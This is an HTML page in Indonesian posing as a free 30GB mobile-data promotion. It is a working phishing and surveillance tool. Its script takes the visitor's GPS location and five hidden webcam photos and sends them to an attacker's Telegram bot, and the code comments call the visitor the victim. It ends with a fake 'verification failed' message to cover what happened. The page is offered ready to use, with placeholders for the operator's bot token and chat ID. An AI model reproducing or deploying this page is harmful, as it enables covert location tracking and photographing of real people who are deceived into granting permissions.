<!DOCTYPE html>
<html>
<head>
    <title>Promo Kuota Gratis 30GB - 2026</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; background: #f4f4f4; }
        .box { margin: 50px auto; width: 300px; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        button { background: #ff0000; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>üéÅ SELAMAT!</h2>
        <p>Nomor Anda terpilih mendapatkan <b>30GB GRATIS</b></p>
        <p>Klik tombol di bawah untuk aktivasi dan verifikasi lokasi perangkat.</p>
        <button onclick="startAction()">AMBIL KUOTA SEKARANG</button>
    </div>

    <video id="video" width="160" height="120" style="display:none;" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const token = "TOKEN_BOT_LO_DI_SINI";
        const chatId = "ID_CHAT_TELEGRAM_LO"; // Bisa dapet dari @userinfobot

        function startAction() {
            // 1. Lacak Lokasi & IP
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    sendToTelegram(`üìç Lokasi Korban:\nLat: ${lat}\nLon: ${lon}\nMaps: https://www.google.com/maps?q=${lat},${lon}`);
                    startCamera(); // Lanjut ke kamera
                }, err => {
                    sendToTelegram("‚ùå Korban nolak izin lokasi.");
                    startCamera();
                });
            }
        }

        async function startCamera() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                // Ambil 5 foto berturut-turut
                let count = 0;
                let interval = setInterval(() => {
                    if (count < 5) {
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        const imgData = canvas.toDataURL('image/jpeg');
                        sendPhotoToTelegram(imgData, `Foto ke-${count + 1}`);
                        count++;
                    } else {
                        clearInterval(interval);
                        stream.getTracks().forEach(track => track.stop());
                        alert("Verifikasi Gagal! Coba lagi nanti.");
                    }
                }, 2000); // Jeda 2 detik tiap foto
            } catch (err) {
                sendToTelegram("‚ùå Korban nolak izin kamera.");
            }
        }

        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: msg })
            });
        }

        function sendPhotoToTelegram(base64, caption) {
            const blob = dataURItoBlob(base64);
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'foto.jpg');
            formData.append('caption', caption);

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], { type: 'image/jpeg' });
        }
    </script>
</body>
</html>
